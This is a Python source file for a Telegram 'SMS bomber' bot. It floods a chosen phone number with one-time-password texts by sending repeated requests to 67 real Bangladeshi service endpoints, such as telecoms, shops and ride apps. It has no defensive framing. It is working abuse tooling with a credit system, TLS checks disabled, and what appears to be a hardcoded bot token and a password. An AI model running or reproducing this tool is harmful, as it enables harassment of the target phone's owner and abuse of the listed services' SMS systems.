#!/usr/bin/env python3
"""
Standalone SMS Bomber Bot (67 APIs)
- Deployable on Railway
"""

import os
import asyncio
import logging
import aiosqlite
import aiohttp
import random
import ssl
from datetime import datetime
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== CONFIG ==========
BOT_TOKEN = os.getenv("8812556044:AAGpg3RiD7P_u6wtCkCSF6yoNutHC2pROQg)
ADMIN_ID = int(os.getenv("ADMIN_ID", "1967494059"))
ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "RobiEntertainment")

DB_PATH = os.path.join(os.path.dirname(__file__), "bomber_database.db")

# ========== 67 APIS (পুরোনো + নতুন) ==========
WORKING_APIS = [
    # ---- পুরোনো ১৯টি ----
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "Addatimes", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
    {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
    {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
    {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
    {"name": "BdTickets", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
    {"name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body": {"mobile": "{phone}"}},
    # ---- নতুন ৪৮টি (ইউনিক) ----
    {"name": "Toybox", "method": "POST", "url": "https://api.toybox.live/bdapps_handler.php", "body": {"phone": "{phone}"}},
    {"name": "Daraz", "method": "POST", "url": "https://member.daraz.com.bd/send-otp", "body": {"phone": "{phone}"}},
    {"name": "Prothomalo", "method": "POST", "url": "https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo", "body": {"phoneNumber": "{phone}"}},
    {"name": "DeeptoPlay_v1", "method": "POST", "url": "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web", "body": {"phone_number": "88{phone}"}},
    {"name": "QuizGiri", "method": "POST", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", "body": {"phone": "{phone}"}},
    {"name": "QuizTime", "method": "POST", "url": "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", "body": {"phone": "{phone}"}},
    {"name": "Shikho", "method": "POST", "url": "https://api.shikho.com/auth/v2/send/sms", "body": {"phone": "{phone}"}},
    {"name": "Jatri_v1", "method": "POST", "url": "https://user-api.jslglobal.co/v1/send-otp", "body": {"phone": "+88{phone}"}},
    {"name": "BetonBook", "method": "POST", "url": "https://api.betonbook.com/api/v5/auth/otp/request", "body": {"phone": "{phone}"}},
    {"name": "AppLink", "method": "POST", "url": "https://applink.com.bd/appstore-v4-server/login/otp/request", "body": {"phone": "{phone}"}},
    {"name": "Robi_send", "method": "POST", "url": "https://webapi.robi.com.bd/v1/send-otp", "body": {"phone": "{phone}"}},
    {"name": "Robi_register", "method": "POST", "url": "https://webapi.robi.com.bd/v1/account/register/otp", "body": {"phone": "{phone}"}},
    {"name": "SoftmaxManager", "method": "POST", "url": "https://softmaxmanager.xyz/api/v1/user/request/otp/", "body": {"phone": "{phone}"}},
    {"name": "Doctime", "method": "POST", "url": "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", "body": {"phone": "{phone}"}},
    {"name": "Banglalink", "method": "POST", "url": "https://eshop-api.banglalink.net/api/v1/customer/send-otp", "body": {"phone": "{phone}"}},
    {"name": "Hishabee", "method": "POST", "url": "https://app.hishabee.business/api/V2/otp/send?mobile_number=", "body": {"mobile_number": "{phone}"}},
    {"name": "Skitto", "method": "POST", "url": "https://www.skitto.com/replace-sim/sent-otp/phone", "body": {"phone": "{phone}"}},
    {"name": "Robi_DA", "method": "POST", "url": "https://da-api.robi.com.bd/da-nll/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Chardike", "method": "POST", "url": "https://api.chardike.com/api/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Apex4U", "method": "POST", "url": "https://api.apex4u.com/api/auth/login", "body": {"phone": "{phone}"}},
    {"name": "HungryNaki", "method": "POST", "url": "https://api.hungrynaki.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "BdTickets_new", "method": "POST", "url": "https://api.bdtickets.com/api/v1/otp/request", "body": {"phone": "{phone}"}},
    {"name": "Rokomari", "method": "POST", "url": "https://api.rokomari.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Pickaboo", "method": "POST", "url": "https://api.pickaboo.com/api/v1/send-otp", "body": {"phone": "{phone}"}},
    {"name": "Ajkerdeal", "method": "POST", "url": "https://api.ajkerdeal.com/api/v1/otp/generate", "body": {"phone": "{phone}"}},
    {"name": "Chaldal", "method": "POST", "url": "https://api.chaldal.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Pathao", "method": "POST", "url": "https://api.pathao.com/api/v1/otp/request", "body": {"phone": "{phone}"}},
    {"name": "BongoBD", "method": "POST", "url": "https://api.bongobd.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "ToffeeLive", "method": "POST", "url": "https://api.toffeelive.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Chorki_v1", "method": "POST", "url": "https://api.chorki.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "VApp", "method": "POST", "url": "https://api.v-app.io/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Teletalk", "method": "POST", "url": "https://selfcare.teletalk.com.bd/api/otp/send", "body": {"phone": "{phone}"}},
    {"name": "10MinuteSchool", "method": "POST", "url": "https://api.10minuteschool.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Shwapno", "method": "POST", "url": "https://api.shwapno.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Shohoz", "method": "POST", "url": "https://www.shohoz.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Sharetrip", "method": "POST", "url": "https://api.sharetrip.net/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Gozayaan", "method": "POST", "url": "https://api.gozayaan.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Evaly", "method": "POST", "url": "https://api.evaly.com.bd/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Bikroy", "method": "POST", "url": "https://bikroy.com/data/otp/send", "body": {"phone": "{phone}"}},
    {"name": "LajPharma", "method": "POST", "url": "https://lajpharma.com/api/send-otp", "body": {"phone": "{phone}"}},
    {"name": "Steadfast", "method": "POST", "url": "https://steadfast.com.bd/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "CineplexBD", "method": "POST", "url": "https://api.cineplexbd.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Priyoshop", "method": "POST", "url": "https://api.priyoshop.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Minabazar", "method": "POST", "url": "https://api.minabazar.com.bd/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Labaid", "method": "POST", "url": "https://api.labaidgroup.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "Praava", "method": "POST", "url": "https://api.praavahealth.com/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "PizzaHut", "method": "POST", "url": "https://pizzahut.com.bd/api/v1/otp/send", "body": {"phone": "{phone}"}},
    {"name": "FoodPanda", "method": "POST", "url": "https://foodpanda.com.bd/api/v1/otp/send", "body": {"phone": "{phone}"}},
]

# ========== LOGGING ==========
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ========== DATABASE ==========
async def init_db():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("""CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY, username TEXT, balance INTEGER DEFAULT 10,
                total_bombing INTEGER DEFAULT 0, join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY, amount INTEGER, usages INTEGER, created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_history (
                user_id INTEGER, code TEXT, redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, code)
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS api_stats (
                api_name TEXT PRIMARY KEY, total_calls INTEGER DEFAULT 0,
                total_success INTEGER DEFAULT 0, total_failed INTEGER DEFAULT 0,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            await db.execute("""CREATE TABLE IF NOT EXISTS user_api_stats (
                user_id INTEGER, api_name TEXT, total_calls INTEGER DEFAULT 0,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, api_name)
            )""")
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50', 50, 100, ?)", (ADMIN_ID,))
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10', 10, 200, ?)", (ADMIN_ID,))
            await db.commit()
            logger.info("✅ Bomber database initialized")
    except Exception as e:
        logger.error(f"Database init error: {e}")

def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', phone)
    return data

def check_success(text, status):
    if status in [200, 201, 202, 204]:
        keywords = ['success', 'otp', 'sent', 'ok', 'true', '1', 'verified', 'done']
        return any(w in text.lower() for w in keywords)
    return False

async def track_api_usage(api_name, user_id, success):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("""INSERT INTO api_stats (api_name, total_calls, total_success, total_failed)
                VALUES (?, 1, ?, ?) ON CONFLICT(api_name) DO UPDATE SET
                total_calls = total_calls + 1, total_success = total_success + ?,
                total_failed = total_failed + ?, last_used = CURRENT_TIMESTAMP""",
                (api_name, 1 if success else 0, 0 if success else 1,
                 1 if success else 0, 0 if success else 1))
            await db.execute("""INSERT INTO user_api_stats (user_id, api_name, total_calls)
                VALUES (?, ?, 1) ON CONFLICT(user_id, api_name) DO UPDATE SET
                total_calls = total_calls + 1, last_used = CURRENT_TIMESTAMP""",
                (user_id, api_name))
            await db.commit()
    except Exception as e:
        logger.error(f"Track error: {e}")

# ========== KEYBOARDS ==========
def main_keyboard():
    return ReplyKeyboardMarkup([["💣 SMS Bomber"], ["👤 My Profile", "🎁 Redeem Code"], ["📊 My Stats"]], resize_keyboard=True)
def back_keyboard():
    return ReplyKeyboardMarkup([["🔙 Back"]], resize_keyboard=True)

# ========== HANDLERS ==========
async def start(update, context):
    user = update.effective_user
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
                         (user.id, user.username or user.first_name))
        await db.commit()
    await update.message.reply_text(
        f"🔥 Welcome {user.first_name}!\n🆔 ID: `{user.id}`\n💰 Balance: 10\n📡 APIs: {len(WORKING_APIS)}",
        parse_mode="Markdown", reply_markup=main_keyboard()
    )

async def profile(update, context):
    user_id = update.effective_user.id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT username, balance, total_bombing, join_date FROM users WHERE user_id=?", (user_id,)) as cur:
            row = await cur.fetchone()
    if row:
        await update.message.reply_text(
            f"👤 Profile\nID: `{user_id}`\nUsername: {row[0] or 'N/A'}\n💰 {row[1]}\n💣 {row[2]}\n📅 {row[3][:10] if row[3] else 'N/A'}",
            parse_mode="Markdown", reply_markup=main_keyboard()
        )

async def stats(update, context):
    user_id = update.effective_user.id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance, total_bombing FROM users WHERE user_id=?", (user_id,)) as cur:
            row = await cur.fetchone()
    if row:
        await update.message.reply_text(
            f"📊 Stats\n💰 {row[0]}\n💣 {row[1]}\n📡 APIs: {len(WORKING_APIS)}",
            reply_markup=main_keyboard()
        )

async def redeem(update, context):
    await update.message.reply_text("🎟️ Enter code:\n`FREE50`, `WELCOME10`", parse_mode="Markdown", reply_markup=back_keyboard())
    context.user_data['state'] = 'redeem'

async def redeem_process(update, context):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT 1 FROM redeem_history WHERE user_id=? AND code=?", (user_id, code)) as cur:
            if await cur.fetchone():
                await update.message.reply_text("❌ Already used!", reply_markup=main_keyboard())
                context.user_data.clear(); return
        async with db.execute("SELECT amount, usages FROM redeem_codes WHERE code=?", (code,)) as cur:
            row = await cur.fetchone()
            if not row or row[1] <= 0:
                await update.message.reply_text("❌ Invalid/expired!", reply_markup=main_keyboard())
                context.user_data.clear(); return
            amount = row[0]
            await db.execute("UPDATE users SET balance = balance + ? WHERE user_id=?", (amount, user_id))
            await db.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code=?", (code,))
            await db.execute("INSERT INTO redeem_history (user_id, code) VALUES (?, ?)", (user_id, code))
            await db.commit()
    await update.message.reply_text(f"🎉 +{amount} credits!", reply_markup=main_keyboard())
    context.user_data.clear()

async def bomber(update, context):
    user_id = update.effective_user.id
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance FROM users WHERE user_id=?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < 1:
                await update.message.reply_text(f"❌ Insufficient credits! Contact @{ADMIN_USERNAME}", reply_markup=main_keyboard())
                return
    await update.message.reply_text(
        "💣 Enter target (11 digits):\nExample: `018XXXXXXXX`",
        parse_mode="Markdown", reply_markup=back_keyboard()
    )
    context.user_data['state'] = 'bomber_number'

async def bomber_number(update, context):
    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text("❌ Invalid! Enter 11 digits:", reply_markup=back_keyboard())
        return
    context.user_data['bomber_number'] = number
    context.user_data['state'] = 'bomber_amount'
    await update.message.reply_text(
        f"✅ {number}\n💥 Enter amount (1-20 per API):\n📊 Total: {len(WORKING_APIS)} × amount",
        parse_mode="Markdown", reply_markup=back_keyboard()
    )

async def bomber_amount(update, context):
    user_id = update.effective_user.id
    number = context.user_data.get('bomber_number')
    try:
        amount = int(update.message.text.strip())
        if amount < 1 or amount > 20:
            await update.message.reply_text("❌ 1-20 only!", reply_markup=back_keyboard())
            return
    except ValueError:
        await update.message.reply_text("❌ Enter number!", reply_markup=back_keyboard())
        return
    if not number:
        await update.message.reply_text("❌ Error!", reply_markup=main_keyboard())
        context.user_data.clear(); return

    total_apis = len(WORKING_APIS)
    total_sms = total_apis * amount
    msg = await update.message.reply_text(f"⏳ Bombing {number}...")

    success_count = failed_count = 0
    api_results = []

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_context)

    async with aiohttp.ClientSession(connector=connector) as session:
        for i, api in enumerate(WORKING_APIS, 1):
            api_success = api_failed = 0
            for j in range(amount):
                try:
                    body = replace_phone(api['body'], number)
                    headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json", "Content-Type": "application/json"}
                    await asyncio.sleep(random.uniform(0.8, 1.5))
                    if api['method'] == 'POST':
                        async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
                            text = await resp.text()
                            if check_success(text, resp.status):
                                api_success += 1; success_count += 1
                            else:
                                api_failed += 1; failed_count += 1
                    else:
                        async with session.get(api['url'], headers=headers, timeout=15) as resp:
                            if resp.status in [200, 201, 202, 204]:
                                api_success += 1; success_count += 1
                            else:
                                api_failed += 1; failed_count += 1
                except Exception:
                    api_failed += 1; failed_count += 1
                if j == amount - 1:
                    await track_api_usage(api['name'], user_id, api_success > 0)
                total_done = (i-1)*amount + (j+1)
                if total_done % 10 == 0 or total_done == total_sms:
                    try:
                        await msg.edit_text(f"⏳ Bombing...\n✅ {success_count} ❌ {failed_count}\n{total_done}/{total_sms}")
                    except: pass
            api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})

    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET balance = balance - 1, total_bombing = total_bombing + 1 WHERE user_id=?", (user_id,))
        await db.commit()

    top = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
    top_text = "\n".join([f"{i+1}. {a['name']}: ✅{a['success']}" for i,a in enumerate(top) if a['success']>0]) or "❌ No success"
    await msg.edit_text(
        f"✅ Done!\n📱 {number}\n📡 {total_apis}\n💥 {total_sms}\n✅ {success_count} ❌ {failed_count}\n📊 {round((success_count/total_sms)*100,2)}%\n\n🏆 Top 10:\n{top_text}",
        reply_markup=main_keyboard()
    )
    context.user_data.clear()

async def handle_message(update, context):
    text = update.message.text
    if text == "🔙 Back":
        await update.message.reply_text("🏠 Main", reply_markup=main_keyboard())
        context.user_data.clear(); return
    if text == "💣 SMS Bomber":
        await bomber(update, context); return
    if text == "👤 My Profile":
        await profile(update, context); return
    if text == "🎁 Redeem Code":
        await redeem(update, context); return
    if text == "📊 My Stats":
        await stats(update, context); return

    state = context.user_data.get('state')
    if state == 'bomber_number':
        await bomber_number(update, context)
    elif state == 'bomber_amount':
        await bomber_amount(update, context)
    elif state == 'redeem':
        await redeem_process(update, context)
    else:
        await update.message.reply_text("❌ Use buttons.", reply_markup=main_keyboard())

# ========== MAIN (সংশোধিত – সিঙ্ক্রোনাস) ==========
def main():
    print("="*50)
    print("💣 SMS BOMBER BOT (UPDATED – 50+ APIs)")
    print(f"✅ APIs Loaded: {len(WORKING_APIS)}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print(f"📁 Database: {DB_PATH}")
    print("="*50)

    # ডেটাবেস ইনিশিয়ালাইজ (অ্যাসিঙ্ক ফাংশনকে সিঙ্ক্রোনাসভাবে চালানো)
    asyncio.run(init_db())

    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # ব্লকিং পোলিং শুরু
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n⛔ Bot stopped.")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
